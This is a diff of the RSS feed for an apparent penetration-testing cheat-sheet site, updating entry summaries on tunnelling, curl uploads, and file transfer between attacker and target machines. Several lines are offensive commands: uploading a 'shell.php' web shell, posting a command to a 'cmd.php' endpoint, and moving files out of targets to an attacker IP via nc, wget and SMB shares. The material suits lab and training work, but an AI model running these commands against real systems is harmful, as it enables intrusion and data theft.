@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/connection_from_public_internet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
-      <description>Simply Catch HTTP Request webhook.site webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+      <description>Simply Catch HTTP Request webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
       <title>Curl</title>
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
+      <description>Advance curl # Url encode POST data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT request with a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT request with a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx # POST request with form param `file` and attach a file curl -X POST -F &amp;#34;file=@shell.</description>
     </item>
     <item>
       <title>File Transfer (Linux To Linux)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
-      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have assh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
+      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have a ssh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
     </item>
     <item>
       <title>File Transfer (Linux to Windows)</title>
@@ -41,6 +41,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>FTP</title>
+      <link>https://tldrbins.github.io/ftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ftp/</guid>
+      <description> Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Download get filename # Upload put filename # Exit quit </description>
     </item>
     <item>
       <title>SMB Server</title>
